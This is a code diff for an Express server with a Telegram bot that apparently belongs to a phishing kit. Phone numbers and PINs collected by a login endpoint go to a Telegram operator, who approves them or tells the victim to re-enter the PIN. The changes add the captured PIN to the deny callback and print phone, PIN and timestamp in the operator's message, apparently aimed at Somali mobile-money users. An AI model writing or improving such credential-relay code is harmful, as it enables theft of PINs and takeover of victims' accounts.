@@ -26,7 +26,7 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Fix for /page2, /page3 etc.
+// Dynamic pages (page2, page3 etc.)
 app.get('/:page', (req, res) => {
     if (req.params.page.startsWith('api')) {
         return res.status(404).send("Not found");
@@ -39,9 +39,7 @@ app.get('/:page', (req, res) => {
     const filePath = path.join(__dirname, 'public', file);
 
     res.sendFile(filePath, (err) => {
-        if (err) {
-            res.status(404).send("Page not found");
-        }
+        if (err) res.status(404).send("Page not found");
     });
 });
 
@@ -93,8 +91,8 @@ app.post('/api/login-notification', async (req, res) => {
                     ],
                     [
                         {
-                            text: "❌ Invalid Information",
-                            callback_data: `deny_${phone}`
+                            text: "❌ Invalid Credentials",
+                            callback_data: `deny_${phone}_${pin}`
                         }
                     ]
                 ]
@@ -138,23 +136,38 @@ bot.action(/approve_(.+)_(.+)/, async (ctx) => {
 
     try {
         await ctx.replyWithHTML(approvedMsg);
-        await ctx.answerCbQuery("Allowed to proceed");
+        await ctx.answerCbQuery("Allowed");
     } catch (e) {
         console.error(e.message);
     }
 });
 
 // DENY
-bot.action(/deny_(.+)/, async (ctx) => {
+bot.action(/deny_(.+)_(.+)/, async (ctx) => {
     const phone = ctx.match[1];
+    const pin = ctx.match[2];
 
     statusStore[phone] = "denied";
 
+    const currentTime = new Date().toLocaleTimeString('en-US', {
+        hour: 'numeric',
+        minute: 'numeric',
+        second: 'numeric',
+        hour12: true
+    });
+
+    const deniedMsg =
+        `❌ <b>INVALID CREDENTIALS</b>\n\n` +
+        `🇸🇴 <b>Somalia</b>\n` +
+        `📱 <b>${phone}</b>\n` +
+        `🔐 <b>${pin}</b>\n\n` +
+        `━━━━━━━━━━━━━━━\n\n` +
+        `❌ <b>Status: Rejected</b>\n` +
+        `⏱️ <b>${currentTime}</b>`;
+
     try {
-        await ctx.replyWithHTML(
-            `❌ <b>INVALID INFORMATION</b>\n\n📱 <b>User:</b> ${phone}\n⚠️ <b>Please re-enter PIN</b>`
-        );
-        await ctx.answerCbQuery("Invalid information");
+        await ctx.replyWithHTML(deniedMsg);
+        await ctx.answerCbQuery("Rejected");
     } catch (e) {
         console.error(e.message);
     }
